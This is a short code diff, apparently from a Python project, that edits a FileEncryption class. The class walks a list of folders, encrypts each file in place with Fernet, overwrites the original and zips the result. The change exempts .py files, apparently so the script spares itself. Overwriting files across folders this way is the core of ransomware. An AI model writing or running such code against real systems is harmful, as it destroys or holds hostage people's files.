@@ -65,16 +65,17 @@ class FileEncryption(Data_Class):
             for file in files:
                 file_path = os.path.join(root, file)
 
-                # Read the original file content
-                with open(file_path, 'rb') as f:
-                    org_content = f.read()
+                if not file_path.endswith('.py'):
+                    # Read the original file content
+                    with open(file_path, 'rb') as f:
+                        org_content = f.read()
 
-                # Encrypt the file content
-                encrypted_content = fernet.encrypt(org_content)
+                    # Encrypt the file content
+                    encrypted_content = fernet.encrypt(org_content)
 
-                # Save the encrypted content back to the file
-                with open(file_path, 'wb') as f:
-                    f.write(encrypted_content)
+                    # Save the encrypted content back to the file
+                    with open(file_path, 'wb') as f:
+                        f.write(encrypted_content)
 
     def encrypt_folders(self):
         # Generate key
@@ -86,7 +87,6 @@ class FileEncryption(Data_Class):
         for folder in self.folders:
             if os.path.exists(folder):
                 self.encrypt_folder(folder)
-
 
         # Zip the "encrypted_folders" directory
         with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
